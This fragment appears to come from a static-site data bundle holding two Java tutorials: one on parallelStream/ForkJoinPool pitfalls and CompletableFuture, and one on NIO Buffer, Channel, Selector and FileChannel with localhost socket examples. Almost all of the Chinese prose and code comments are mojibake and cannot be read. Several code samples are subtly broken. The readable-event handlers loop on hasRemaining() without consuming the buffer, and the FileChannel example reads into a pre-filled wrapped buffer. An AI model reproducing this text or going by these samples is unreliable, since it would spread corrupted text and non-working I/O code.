è¯·æ±æ¯ä¸ä¸ªååºç¥æ¢èä¸ä¼é»å¡æä½çä¸ä¸ªè¿ç¨ãæä»¥å¨ææ¶å»ææçº¿ç¨é½ä¼è°ç¨ get () æ¹æ³å¹¶ä¸å¨é£éç­å¾ç»æè¿å.\n\nååè¿å¤´ä»ç»æèä¸ä¸è¿ä¸ªåè½çå®ç°è¿ç¨æ¯æä»¬ä¸å¼å§æ³è¦çåï¼æä»¬æ¯å¨åä¸æ¶é´ç­å¾ææçç»æï¼èä¸æ¯éåè¿ä¸ªåè¡¨æé¡ºåºç­å¾æ¯ä¸ªåç­ãç¶èï¼ç±äº forkjoinpool workders çå­å¨ï¼è¿æ ·å¹³è¡çç­å¾ç¸å¯¹äºä½¿ç¨ä¸»çº¿ç¨çç­å¾ä¼äº§ççä¸ç§å¯ä½ç¨.\n\nç°å¨ forkjoin pool (å³äº forkjion çæ´å¤å®ç°ä½ å¯ä»¥å»æç´¢å¼æä¸­å»çä¸ä¸ä»çå·ä½å®ç°æ¹å¼) çå®ç°æ¯ï¼å®å¹¶ä¸ä¼å ä¸ºäº§çäºæ°ç workers èæµæ¶æé»å¡ç workersãé£ä¹å¨æä¸ªæ¶é´ææ forkjoinpool.common () ççº¿ç¨é½ä¼è¢«ç¨åãä¹å°±æ¯è¯´ï¼ä¸ä¸æ¬¡ä½ è°ç¨è¿ä¸ªæ¥è¯¢æ¹æ³ï¼å°±å¯è½ä¼å¨ä¸ä¸ªæ¶é´ä¸å¶ä»ç parallel stream åæ¶è¿è¡ï¼èå¯¼è´ç¬¬äºä¸ªä»»å¡çæ§è½å¤§å¤§åæãæèè¯´ï¼ä¾å¦ä½ å¨è¿ä¸ªåè½éæ¯ç¨æ¥å¿«éè¿åè°ç¨çç¬¬ä¸æ¹ api çï¼èå¨å¶ä»çåè½éæ¯ç¨äºä¸äºç®åçæ°æ®å¹¶è¡è®¡ç®çï¼ä½æ¯åå¦ä½ åè°ç¨äºè¿ä¸ªåè½ï¼åä¸æ¶é´ä¹åè°ç¨è®¡ç®çå½æ°ï¼é£ä¹è¿é forkjionpool çå®ç°ä¼è®©ä½ è®¡ç®çå½æ°å¤§æææ£.\n\nä¸è¿ä¹ä¸è¦æ¥çå»åæ§½ forkjoinpool çå®ç°ï¼å¨ä¸åçæåµä¸ä½ å¯ä»¥ç»å®ä¸ä¸ª managedblocker å®ä¾å¹¶ä¸ç¡®ä¿å®ç¥éå¨ä¸ä¸ªé»å¡è°ç¨ä¸­åºè¯¥ä»ä¹æ¶åå»æµæ¶æå¡ä½ç workers. ç°å¨æææçä¸ç¹æ¯ï¼å¨ä¸ä¸ª parallel stream å¤çä¸­å¹¶ä¸ä¸å®æ¯é»å¡è°ç¨ä¼æå»¶ç¨åºçæ§è½ãä»»ä½è¢«ç¨äºæ å°å¨ä¸ä¸ªéåä¸çé¿æ¶é´è¿è¡çå½æ°é½ä¼äº§çåæ ·çé®é¢.\n\næ­£å¦æä»¬ä¸é¢é£ä¸ªåå­çæåµåæå¾ç¥ï¼lambda çæ§è¡å¹¶ä¸æ¯ç¬é´å®æçï¼ææä½¿ç¨ parallel streams çç¨åºé½æå¯è½æä¸ºé»å¡ç¨åºçæºå¤´ï¼å¹¶ä¸å¨æ§è¡è¿ç¨ä¸­ç¨åºä¸­çå¶ä»é¨åå°æ æ³è®¿é®è¿äº workers, è¿æå³çä»»ä½ä¾èµ parallel streams çç¨åºå¨ä»ä¹å«çä¸è¥¿å ç¨ç common forkjoinpool æ¶å°ä¼åå¾ä¸å¯é¢ç¥å¹¶ä¸æèå±æº.\n\næä¹æ­£ç¡®ä½¿ç¨ parallelstream\nå¦æä½ æ­£å¨åä¸ä¸ªå¶ä»å°æ¹é½æ¯åçº¿ç¨çç¨åºå¹¶ä¸åç¡®å°ç¥éä»ä¹æ¶åä½ åºè¯¥è¦ä½¿ç¨ parallel streamsï¼è¿æ ·çè¯ä½ å¯è½ä¼è§å¾è¿ä¸ªé®é¢æä¸ç¹è¤æµãç¶èï¼æä»¬å¾å¤äººæ¯å¨å¤ç web åºç¨ãåç§ä¸åçæ¡æ¶ä»¥åééçº§åºç¨æå¡ãä¸ä¸ªæå¡å¨æ¯ææ ·è¢«è®¾è®¡æä¸ä¸ªå¯ä»¥æ¯æå¤ç§ç¬ç«åºç¨çä¸»æºçï¼è°ç¥éå¢ï¼ç»ä½ ä¸ä¸ªå¯ä»¥å¹¶è¡çå´ä¸è½æ§å¶è¾å¥ç parallel stream.\n\nå¾æ±æ­ï¼è¯·åè°æç¨çæ æ³¨ [æä¹æ­£ç¡®ä½¿ç¨ parallelstream], å ä¸ºç®åä¸ºæ­¢æä¹æ²¡æåç°ä¸ä¸ªå¥½çæ¹å¼æ¥è®©æçæ­£çæ­£ç¡®ä½¿ç¨ parallelstream. ä¸é¢çç½ä¸åçä¸¤ç§æ¹å¼:\n\nä¸ç§æ¹å¼æ¯éå¶ forkjoinpool æä¾çå¹¶è¡æ°ãå¯ä»¥éè¿ä½¿ç¨ - djava.util.concurrent.forkjoinpool.common.parallelism=1 æ¥éå¶çº¿ç¨æ± çå¤§å°ä¸º 1ãä¸åä»å¹¶è¡åä¸­å¾å°å¥½å¤å¯ä»¥æç»éè¯¯çä½¿ç¨å® (å¶å®è¿ä¸ªæ¹å¼è¿æ¯æç¹æç¬çï¼æ¢ç¶è¿æ ·æé£æè¿ä¸å¦ä¸å»ä½¿ç¨å¹¶è¡æµ)ã\n\nå¦ä¸ç§æ¹å¼å°±æ¯ï¼ä¸ä¸ªè¢«ç§°ä¸ºå·¥ä½åºçå¯ä»¥è®© forkjoinpool å¹³è¡æ¾ç½®ç parallelstream () å®ç°ãä¸å¹¸çæ¯ç°å¨ç jdk è¿æ²¡æå®ç°ã\n\nparallel streams æ¯æ æ³é¢æµçï¼èä¸æ³è¦æ­£ç¡®å°ä½¿ç¨å®æäºæ£æãå ä¹ä»»ä½ parallel streams çä½¿ç¨é½ä¼å½±åç¨åºä¸­æ å³é¨åçæ§è½ï¼èä¸æ¯ä¸ç§æ æ³é¢æµçæ¹å¼ããä½æ¯å¨è°ç¨ stream.parallel () æè parallelstream () æ¶åå¨æçä»£ç éä¹åæä»ç¶ä¼éæ°å®¡è§ä¸éä»ç»æçç¨åºç©¶ç«ä¼å¸¦æ¥ä»ä¹é®é¢ï¼ä»è½æå¤å¤§çæåï¼æ¯å¦æä½¿ç¨ä»çæä¹.\n\nstream or parallelstreamï¼\nä¸é¢æä»¬ä¹çå°äº parallelstream æå¸¦æ¥çéæ£åå¥½å¤ï¼é£ä¹ï¼å¨ä» stream å parallelstream æ¹æ³ä¸­è¿è¡éæ©æ¶ï¼æä»¬å¯ä»¥èèä»¥ä¸å ä¸ªé®é¢ï¼\n\n>  1. æ¯å¦éè¦å¹¶è¡ï¼\n>  2. ä»»å¡ä¹é´æ¯å¦æ¯ç¬ç«çï¼æ¯å¦ä¼å¼èµ·ä»»ä½ç«ææ¡ä»¶ï¼\n>  3. ç»ææ¯å¦åå³äºä»»å¡çè°ç¨é¡ºåºï¼\n\nå¯¹äºé®é¢ 1ï¼å¨åç­è¿ä¸ªé®é¢ä¹åï¼ä½ éè¦å¼æ¸æ¥ä½ è¦è§£å³çé®é¢æ¯ä»ä¹ï¼æ°æ®éæå¤å¤§ï¼è®¡ç®çç¹ç¹æ¯ä»ä¹ï¼å¹¶ä¸æ¯ææçé®é¢é½éåä½¿ç¨å¹¶åç¨åºæ¥æ±è§£ï¼æ¯å¦å½æ°æ®éä¸å¤§æ¶ï¼é¡ºåºæ§è¡å¾å¾æ¯å¹¶è¡æ§è¡æ´å¿«ãæ¯ç«ï¼åå¤çº¿ç¨æ± åå¶å®ç¸å³èµæºä¹æ¯éè¦æ¶é´çãä½æ¯ï¼å½ä»»å¡æ¶åå° i/o æä½å¹¶ä¸ä»»å¡ä¹é´ä¸äºç¸ä¾èµæ¶ï¼é£ä¹å¹¶è¡åå°±æ¯ä¸ä¸ªä¸éçéæ©ãéå¸¸èè¨ï¼å°è¿ç±»ç¨åºå¹¶è¡åä¹åï¼æ§è¡éåº¦ä¼æåå¥½å ä¸ªç­çº§ã\n\nå¯¹äºé®é¢ 2ï¼å¦æä»»å¡ä¹é´æ¯ç¬ç«çï¼å¹¶ä¸ä»£ç ä¸­ä¸æ¶åå°å¯¹åä¸ä¸ªå¯¹è±¡çæä¸ªç¶ææèæä¸ªåéçæ´æ°æä½ï¼é£ä¹å°±è¡¨æä»£ç æ¯å¯ä»¥è¢«å¹¶è¡åçã\n\nå¯¹äºé®é¢ 3ï¼ç±äºå¨å¹¶è¡ç¯å¢ä¸­ä»»å¡çæ§è¡é¡ºåºæ¯ä¸ç¡®å®çï¼å æ­¤å¯¹äºä¾èµäºé¡ºåºçä»»å¡èè¨ï¼å¹¶è¡åä¹è®¸ä¸è½ç»åºæ­£ç¡®çç»æã\n\n\n# completablefuture\n\ncompletablefuture æ¯ä¸ä¸ªå¼æ­¥ç¼ç¨ apiï¼ç¨çæ¯ forkjoin ççº¿ç¨å®ç°ï¼å¯ä»¥å¸®æä»¬è¾¾å°ä½¿ç¨å¤æ ¸å¤çä»»å¡çææãcompletablefuture æä¾äº supplyasync å runasync ä¸¤ä¸ªæ¹æ³ï¼supplyasync å¼æ­¥å®æåè¿åä¸ä¸ªå·ä½çæ°æ®ï¼runasync ç´æ¥å°±æ¯å¼æ­¥æ§è¡ï¼æ§è¡å®ä¾¿ç»æäºãæä»¬æ¥ççç®åçç¨æ³ï¼\n\n * supplyasync ().thencompose () æ¹æ³åè®¸ä½ å¯¹ä¸¤ä¸ªå¼æ­¥æä½è¿è¡æµæ°´çº¿ï¼ç¬¬ä¸ä¸ªæä½å®ææ¶ï¼å°å¶ç»æä½ä¸ºåæ°ä¼ éç»ç¬¬äºä¸ªæä½\n * supplyasync ().thencombine () ä½ éè¦å°ä¸¤ä¸ªå®å¨ä¸ç¸å¹²ç completablefuture å¯¹è±¡çç»ææ´åèµ·æ¥ï¼èä¸ä½ ä¹ä¸å¸æç­å°ç¬¬ä¸ä¸ªä»»å¡å®å¨ç»ææå¼å§ç¬¬äºé¡¹ä»»å¡\n * supplyasync ().thenaccept () å®æ¥æ¶ completablefuture æ§è¡å®æ¯åçè¿åå¼ååæ°\n * supplyasync ().thenapply () è¯¥æ¹æ³ä¼ç­ completablefuture æ§è¡å®ç¬¬ä¸ä¸ªç»æ å°±è°ç¨å¶æ§è¡.',charsets:{cjk:!0}},{title:"JAVA NIO API",frontmatter:{title:"JAVA NIO API",date:"2023-06-25T09:22:36.000Z",permalink:"/language/java/base/2/",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/00.%E8%AF%AD%E8%A8%80/01.JAVA/01.%E5%9F%BA%E7%A1%80/2.JAVA%20NIO%20API.html",relativePath:"00.è¯­è¨/01.JAVA/01.åºç¡/2.JAVA NIO API.md",key:"v-43985582",path:"/language/java/base/2/",headers:[{level:2,title:"æ¦è¿°",slug:"æ¦è¿°",normalizedTitle:"æ¦è¿°",charIndex:2},{level:2,title:"Buffer",slug:"buffer",normalizedTitle:"buffer",charIndex:314},{level:2,title:"Channel",slug:"channel",normalizedTitle:"channel",charIndex:1222},{level:3,title:"serverç«¯",slug:"serverç«¯",normalizedTitle:"server ç«¯",charIndex:1307},{level:3,title:"clientç«¯",slug:"clientç«¯",normalizedTitle:"client ç«¯",charIndex:2057},{level:2,title:"Selector",slug:"selector",normalizedTitle:"selector",charIndex:2362},{level:3,title:"æå¡ç«¯ä»£ç ",slug:"æå¡ç«¯ä»£ç ",normalizedTitle:"æå¡ç«¯ä»£ç ",charIndex:2574},{level:3,title:"å®¢æ·ç«¯ä»£ç ",slug:"å®¢æ·ç«¯ä»£ç ",normalizedTitle:"å®¢æ·ç«¯ä»£ç ",charIndex:5280},{level:2,title:"FileChannel",slug:"filechannel",normalizedTitle:"filechannel",charIndex:7108}],lastUpdated:"12/24/2024, 6:15:06 PM",lastUpdatedTimestamp:1735035306e3,headersStr:"æ¦è¿° Buffer Channel serverç«¯ clientç«¯ Selector æå¡ç«¯ä»£ç  å®¢æ·ç«¯ä»£ç  FileChannel",content:'# æ¦è¿°\n\nNon-Blocking I/Oï¼æ¯ä¸ç§éé»å¡éä¿¡æ¨¡åãå¨ java.nio å¼ jdk1.4 çæ¬å¼å¥çä¸å¥ APIï¼æä»¬å¯ä»¥å©ç¨è¿å¥ API å®ç°éé»å¡çç½ç»ç¼ç¨æ¨¡åã\n\nå¤§æ°æ®åå®æ¶è®¡ç®çå´èµ·ï¼é«æ§è½ RPC æ¡æ¶ä¸ç½ç»ç¼ç¨ææ¯åæ¬¡æä¼ç¦ç¹ãæ¯å¾ Fackebook ç Thrift æ¡æ¶ï¼scala ç Akka æ¡æ¶ï¼å®æ¶æµé¢åç StormãSpark æ¡æ¶ï¼åæèå¼æºåå¸å¼æ°æ®åºç MycatãVoltDBï¼è¿äºæ¡æ¶çåºå±éä¿¡é½éç¨äº NIO éä¿¡ææ¯ãè java é¢åéå¤§åé¼é¼ç NIO æ¡æ¶ ââNettyï¼åè¢«ä¼å¤çå¼æºæåä¸è½¯ä»¶æéç¨ã\n\nNIO éåé«å¹¶åãé«è®¿é®éãæ®µè¯·æ±\n\n\n# Buffer\n\nBuffer ç¼å²åºï¼æ¯ NIO éè®¯æ¶æ°æ®çè½½ä½ãå¸¸ç¨çç¼å²åºæ¯ ByteBuffer (å­èç¼å²åº)ã\n\n// åå»º10ä¸ªå­èçç¼å²åº\nByteBuffer buffer = ByteBuffer.allocate(capacity);\n\n\n1\n2\n\n\nç¼å²åºçå±æ§ï¼\n\n * capacity (å®¹é)ï¼å³å®äºå­å¨å®¹éçä¸çº¿ï¼ä¸ç»åå®ï¼ä¸è½æ´æ¹ã\n * limit (éå¶)ï¼éå¶çåå§ä½ç½® = capacity\n * position (ä½ç½®)ï¼åå§å¼æ¯ 0ï¼ä½æ¯å½æå¥ä¸ä¸ªå­èï¼å°±ä¼ååç§»å¨ä¸ä½\n\nByteBuffer é»è®¤ç¨çå­ç±»æ¯ HeapByteBufferï¼å åå­èç¼å²åºï¼ï¼è¿ç§ç±»åçç¼å²åºï¼å¨ JVM çå ä¸­åå»ºçï¼å³ç¼å²åºççå½å¨æç± (GC) JVM ç®¡ççãMappedByteBufferï¼å å¤å­èç¼å²åºï¼ï¼å¯ä»¥ä½¿ç¨æä½ç³»ç»çåå­ï¼ä½¿ç¨åºæ¯å½åå»ºå¤§çå­èç¼å²åºæ¶ï¼æ³¨æï¼å¦æä½¿ç¨å å¤ï¼çå½å¨æçç®¡çéè¦èªæ¥å®ç°ã\n\nç¼å²åºçæ¹æ³ï¼\n\n * get () æ¹æ³ä¼æ ¹æ®å½å position çä½ç½®åå¼ï¼æå¤ï¼get () æ²¡è°ç¨ä¸æ¬¡ï¼ä½ç½®ä¼ç§»å¨ä¸ä½ã\n * buffer.limit (buffer.position ()) è·å buffer ç position ä½ç½®ï¼å¹¶èµäº limit éå¶\n * buffer.flip () å buffer.limit (buffer.position ()) ç±»ä¼¼\n * ByteBuffer.wrap (âtestâ.getByte ()) æ ¹æ®ä¼ å¥çå­èæ°ç»åå»ºå¯¹åºå¤§å°çç¼å²åºï¼å¹¶åå¥æ°æ®ï¼åå®åï¼ä¼èªå¨æç¨ flip () æ¹æ³\n * clear () è¯¥æ¹æ³ä¸ä¼æ¸é¤ç¼å²åºçæ°æ®ï¼åªä¼æ position éç½®ä¸º 0ï¼è®©åé¢ç (3 å­è) æ°æ°æ®ï¼è¦çåé¢ç (6 å­è) èæ°æ®ï¼ä½è¿æ 3 å­èçæ°æ®æ²¡æè¦çï¼å¯ä»¥ä½¿ç¨ flip () æ¥æ¸é¤ææªè¦ççèæ°æ®ã\n * hasRemaining () å¤æ­ limit å position ä¹é´æ¯å¦è¿æåç´ å¯è¯»ï¼æè¿å trueï¼æ è¿å false\n\n\n# Channel\n\nChannel æ¯ééï¼å°±ååè¯å¬è·¯ä» A åå¸éå¾ B åå¸ï¼è buffer å°±æ¯è´§è½¦ãå socket çè¿æ¥æ¹å¼å·®ä¸å¤ï¼å·ä½ä»£ç å¦ä¸ï¼\n\n\n# server ç«¯\n\n    public static void main(String[] args) throws Exception {\n        ServerSocketChannel server = ServerSocketChannel.open();\n        // è®¾ç½® socket server ä¸ºéé»å¡éä¿¡\n        server.configureBlocking(false);\n        // ç»å® æ¬å° ipå8888 åä¸ºæå¡å¨è¿æ¥å£\n        server.bind(new InetSocketAddress(8888));\n\n        SocketChannel sc = null;\n        // ç­å¾æ¥æ¶å°ä¸ä¸ªéä¿¡è¿æ¥\n        while (sc == null){\n            sc = server.accept();\n        }\n        // è®¾ç½®æ¹éä¿¡è¿æ¥ ä¹ä¸ºéé»å¡æ¨¡å¼\n        sc.configureBlocking(false);\n\n        ByteBuffer buffer = ByteBuffer.allocate(10);\n        // è¯»ååéBuffer\n        sc.read(buffer);\n        String str = new String(buffer.array());\n        System.out.println("æå¡æ¶å°æ¶æ¯ï¼"+str);\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n\n\n\n# client ç«¯\n\n    public static void main(String[] args) throws Exception {\n        SocketChannel sock = SocketChannel.open();\n        sock.connect(new InetSocketAddress("127.0.0.1",8888));\n        ByteBuffer buffer = ByteBuffer.wrap("hellow".getBytes());\n        sock.write(buffer);\n    }\n\n\n1\n2\n3\n4\n5\n6\n\n\n\n# Selector\n\nSelector ä¸è¬ç§° ä¸ºéæ©å¨ ï¼å½ç¶ä½ ä¹å¯ä»¥ç¿»è¯ä¸º å¤è·¯å¤ç¨å¨ ãå®æ¯ Java NIO æ ¸å¿ç»ä»¶ä¸­çä¸ä¸ªï¼ç¨äºæ£æ¥ä¸ä¸ªæå¤ä¸ª NIO Channelï¼ééï¼çç¶ææ¯å¦å¤äºå¯è¯»ãå¯åãå¦æ­¤å¯ä»¥å®ç°åçº¿ç¨ç®¡çå¤ä¸ª channels, ä¹å°±æ¯å¯ä»¥ç®¡çå¤ä¸ªç½ç»é¾æ¥ã\nä½¿ç¨ Selector çå¥½å¤å¨äºï¼ ä½¿ç¨æ´å°ççº¿ç¨æ¥å°±å¯ä»¥æ¥å¤çééäºï¼ ç¸æ¯ä½¿ç¨å¤ä¸ªçº¿ç¨ï¼é¿åäºçº¿ç¨ä¸ä¸æåæ¢å¸¦æ¥çå¼éã\n\n\n# æå¡ç«¯ä»£ç \n\n    public static void main(String[] args) throws Exception {\n        ServerSocketChannel server = ServerSocketChannel.open();\n        server.configureBlocking(false);\n        server.bind(new InetSocketAddress(8888));\n        // è·åå¤è·¯å¤ç¨éæ©å¨\n        Selector selector = Selector.open();\n        // æå¡ç«¯æ³¨å æ¥æ¶å®¢æ·ç«¯ç çå¬äºä»¶\n        server.register(selector, SelectionKey.OP_ACCEPT);\n        while(true){\n            // è¯¥æ¹æ³ä¼é»å¡ï¼ç´å°æäºä»¶å°è¾¾uï¼æä¼æ¾å¿\n            selector.select();\n            // è·åææäºä»¶çkeyï¼èµ°å°è¿ä»£è¡¨æäºä»¶æ¥äº\n            Set<SelectionKey> selectionKeys = selector.selectedKeys();\n            // åå¤è¿­ä»£ææäºä»¶\n            Iterator<SelectionKey> selectionKeyIterable = selectionKeys.iterator();\n            while (selectionKeyIterable.hasNext()){\n                // è·åäºä»¶\n                SelectionKey selectionKey = selectionKeyIterable.next();\n                // è¡¨ç¤ºæå®¢æ·è¿æ¥\n                if(selectionKey.isAcceptable()){\n                    // å¾å°è¿æ¥\n                    ServerSocketChannel serverSocketChannel = (ServerSocketChannel) selectionKey.channel();\n                    // å»ºç«åå¯¹åºå®¢æ·éä¿¡çéé\n                    SocketChannel socketChannel = serverSocketChannel.accept();\n                    // è°ç¥ä¸ºéé»å¡éä¿¡\n                    socketChannel.configureBlocking(false);\n                    // æ³¨åæ¥æè¯»åäºä»¶\n                    socketChannel.register(selector, SelectionKey.OP_READ|SelectionKey.OP_WRITE);\n                }\n                // è¡¨ç¤ºææ°æ®åéå°æå¡ç«¯,è¿éå¯ä»¥ä¸ç¨ç»§ç»­è®¾ç½® configureBlocking ä¸ºéé»å¡ï¼å¨è¿æ¥çæ¶åééå·²ç»æ è®°è¿äº\n                if(selectionKey.isReadable()){\n                    // å¾å°è¿æ¥\n                    SocketChannel socketChannel = (SocketChannel) selectionKey.channel();\n                    ByteBuffer byteBuffer = ByteBuffer.allocateDirect(20);\n                    socketChannel.read(byteBuffer);\n                    while (byteBuffer.hasRemaining()){\n                        System.out.println("æ¶å°å®¢æ·ç«¯çéä¿¡: "+new String(byteBuffer.array()));\n                    }\n                    \n                }\n                // ç»å®¢æ·ç«¯åéæ°æ®\n                if(selectionKey.isWritable()){\n                    SocketChannel socketChannel = (SocketChannel) selectionKey.channel();\n                    ByteBuffer byteBuffer = ByteBuffer.wrap("3333333".getBytes());\n                    // è¯»åæ¶éé»å¡çï¼ä¸ºäºç¡®ä¿è¯»åå®æ´æ§ï¼éè¦å ä¸ hasRemaining\n                    while (byteBuffer.hasRemaining()){\n                        socketChannel.write(byteBuffer);\n                    }\n                }\n                // å¤çå®æ¯ç§»é¤äºä»¶ï¼é¿åéå¤\n                selectionKeyIterable.remove();\n            }\n        }\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n\n\n\n# å®¢æ·ç«¯ä»£ç \n\n    public static void main(String[] args) throws Exception {\n        SocketChannel socketChannel = SocketChannel.open();\n        socketChannel.configureBlocking(false);\n        socketChannel.connect(new InetSocketAddress("127.0.0.1",8888));\n        Selector selector = Selector.open();\n        socketChannel.register(selector,SelectionKey.OP_CONNECT);\n        while(true){\n            selector.select();\n            Iterator<SelectionKey> selectionKeyIterator = selector.selectedKeys().iterator();\n            while (selectionKeyIterator.hasNext()){\n                SelectionKey selectionKey = selectionKeyIterator.next();\n                if(selectionKey.isConnectable()){\n                    SocketChannel sc = (SocketChannel) selectionKey.channel();\n                    sc.register(selector,SelectionKey.OP_READ|SelectionKey.OP_WRITE);\n                }\n                if(selectionKey.isReadable()){\n                    SocketChannel sc = (SocketChannel) selectionKey.channel();\n                    ByteBuffer byteBuffer = ByteBuffer.allocate(10);\n                    while (byteBuffer.hasRemaining()){\n                        System.out.println("æ¶å°æå¡ç«¯æ¶æ¯ï¼"+new String(byteBuffer.array()));\n                    } \n                }\n                if(selectionKey.isWritable()){\n                    SocketChannel sc = (SocketChannel) selectionKey.channel();\n                    ByteBuffer byteBuffer = ByteBuffer.wrap("3333333".getBytes());\n                    // è¯»åæ¶éé»å¡çï¼ä¸ºäºç¡®ä¿è¯»åå®æ´æ§ï¼éè¦å ä¸ hasRemaining\n                    while (byteBuffer.hasRemaining()){\n                        sc.write(byteBuffer);\n                    }\n                }\n                selectionKeyIterator.remove();\n            }\n        }\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n\n\n\n# FileChannel\n\n    public static void main(String[] args) throws Exception {\n        FileChannel write = new FileOutputStream(new File("1.txt")).getChannel();\n        ByteBuffer writeByteBuffer = ByteBuffer.wrap("2321312".getBytes());\n        if(writeByteBuffer.hasRemaining()) {\n            write.write(writeByteBuffer);\n        }\n        write.close();\n\n        FileChannel read = new FileInputStream(new File("1.txt")).getChannel();\n        ByteBuffer readByteBuffer = ByteBuffer.wrap("2321312".getBytes());\n        read.read(readByteBuffer);\n        if(readByteBuffer.hasRemaining()) {\n            System.out.println("æä»¶åå®¹ï¼"+new String(readByteBuffer.array()));\n        }\n        read.close();\n\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n',normalizedContent:'# æ¦è¿°\n\nnon-blocking i/oï¼æ¯ä¸ç§éé»å¡éä¿¡æ¨¡åãå¨ java.nio å¼ jdk1.4 çæ¬å¼å¥çä¸å¥ apiï¼æä»¬å¯ä»¥å©ç¨è¿å¥ api å®ç°éé»å¡çç½ç»ç¼ç¨æ¨¡åã\n\nå¤§æ°æ®åå®æ¶è®¡ç®çå´èµ·ï¼é«æ§è½ rpc æ¡æ¶ä¸ç½ç»ç¼ç¨ææ¯åæ¬¡æä¼ç¦ç¹ãæ¯å¾ fackebook ç thrift æ¡æ¶ï¼scala ç akka æ¡æ¶ï¼å®æ¶æµé¢åç stormãspark æ¡æ¶ï¼åæèå¼æºåå¸å¼æ°æ®åºç mycatãvoltdbï¼è¿äºæ¡æ¶çåºå±éä¿¡é½éç¨äº nio éä¿¡ææ¯ãè java é¢åéå¤§åé¼é¼ç nio æ¡æ¶ âânettyï¼åè¢«ä¼å¤çå¼æºæåä¸è½¯ä»¶æéç¨ã\n\nnio éåé«å¹¶åãé«è®¿é®éãæ®µè¯·æ±\n\n\n# buffer\n\nbuffer ç¼å²åºï¼æ¯ nio éè®¯æ¶æ°æ®çè½½ä½ãå¸¸ç¨çç¼å²åºæ¯ bytebuffer (å­èç¼å²åº)ã\n\n// åå»º10ä¸ªå­èçç¼å²åº\nbytebuffer buffer = bytebuffer.allocate(capacity);\n\n\n1\n2\n\n\nç¼å²åºçå±æ§ï¼\n\n * capacity (å®¹é)ï¼å³å®äºå­å¨å®¹éçä¸çº¿ï¼ä¸ç»åå®ï¼ä¸è½æ´æ¹ã\n * limit (éå¶)ï¼éå¶çåå§ä½ç½® = capacity\n * position (ä½ç½®)ï¼åå§å¼æ¯ 0ï¼ä½æ¯å½æå¥ä¸ä¸ªå­èï¼å°±ä¼ååç§»å¨ä¸ä½\n\nbytebuffer é»è®¤ç¨çå­ç±»æ¯ heapbytebufferï¼å åå­èç¼å²åºï¼ï¼è¿ç§ç±»åçç¼å²åºï¼å¨ jvm çå ä¸­åå»ºçï¼å³ç¼å²åºççå½å¨æç± (gc) jvm ç®¡ççãmappedbytebufferï¼å å¤å­èç¼å²åºï¼ï¼å¯ä»¥ä½¿ç¨æä½ç³»ç»çåå­ï¼ä½¿ç¨åºæ¯å½åå»ºå¤§çå­èç¼å²åºæ¶ï¼æ³¨æï¼å¦æä½¿ç¨å å¤ï¼çå½å¨æçç®¡çéè¦èªæ¥å®ç°ã\n\nç¼å²åºçæ¹æ³ï¼\n\n * get () æ¹æ³ä¼æ ¹æ®å½å position çä½ç½®åå¼ï¼æå¤ï¼get () æ²¡è°ç¨ä¸æ¬¡ï¼ä½ç½®ä¼ç§»å¨ä¸ä½ã\n * buffer.limit (buffer.position ()) è·å buffer ç position ä½ç½®ï¼å¹¶èµäº limit éå¶\n * buffer.flip () å buffer.limit (buffer.position ()) ç±»ä¼¼\n * bytebuffer.wrap (âtestâ.getbyte ()) æ ¹æ®ä¼ å¥çå­èæ°ç»åå»ºå¯¹åºå¤§å°çç¼å²åºï¼å¹¶åå¥æ°æ®ï¼åå®åï¼ä¼èªå¨æç¨ flip () æ¹æ³\n * clear () è¯¥æ¹æ³ä¸ä¼æ¸é¤ç¼å²åºçæ°æ®ï¼åªä¼æ position éç½®ä¸º 0ï¼è®©åé¢ç (3 å­è) æ°æ°æ®ï¼è¦çåé¢ç (6 å­è) èæ°æ®ï¼ä½è¿æ 3 å­èçæ°æ®æ²¡æè¦çï¼å¯ä»¥ä½¿ç¨ flip () æ¥æ¸é¤ææªè¦ççèæ°æ®ã\n * hasremaining () å¤æ­ limit å position ä¹é´æ¯å¦è¿æåç´ å¯è¯»ï¼æè¿å trueï¼æ è¿å false\n\n\n# channel\n\nchannel æ¯ééï¼å°±ååè¯å¬è·¯ä» a åå¸éå¾ b åå¸ï¼è buffer å°±æ¯è´§è½¦ãå socket çè¿æ¥æ¹å¼å·®ä¸å¤ï¼å·ä½ä»£ç å¦ä¸ï¼\n\n\n# server ç«¯\n\n    public static void main(string[] args) throws exception {\n        serversocketchannel server = serversocketchannel.open();\n        // è®¾ç½® socket server ä¸ºéé»å¡éä¿¡\n        server.configureblocking(false);\n        // ç»å® æ¬å° ipå8888 åä¸ºæå¡å¨è¿æ¥å£\n        server.bind(new inetsocketaddress(8888));\n\n        socketchannel sc = null;\n        // ç­å¾æ¥æ¶å°ä¸ä¸ªéä¿¡è¿æ¥\n        while (sc == null){\n            sc = server.accept();\n        }\n        // è®¾ç½®æ¹éä¿¡è¿æ¥ ä¹ä¸ºéé»å¡æ¨¡å¼\n        sc.configureblocking(false);\n\n        bytebuffer buffer = bytebuffer.allocate(10);\n        // è¯»ååébuffer\n        sc.read(buffer);\n        string str = new string(buffer.array());\n        system.out.println("æå¡æ¶å°æ¶æ¯ï¼"+str);\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n\n\n\n# client ç«¯\n\n    public static void main(string[] args) throws exception {\n        socketchannel sock = socketchannel.open();\n        sock.connect(new inetsocketaddress("127.0.0.1",8888));\n        bytebuffer buffer = bytebuffer.wrap("hellow".getbytes());\n        sock.write(buffer);\n    }\n\n\n1\n2\n3\n4\n5\n6\n\n\n\n# selector\n\nselector ä¸è¬ç§° ä¸ºéæ©å¨ ï¼å½ç¶ä½ ä¹å¯ä»¥ç¿»è¯ä¸º å¤è·¯å¤ç¨å¨ ãå®æ¯ java nio æ ¸å¿ç»ä»¶ä¸­çä¸ä¸ªï¼ç¨äºæ£æ¥ä¸ä¸ªæå¤ä¸ª nio 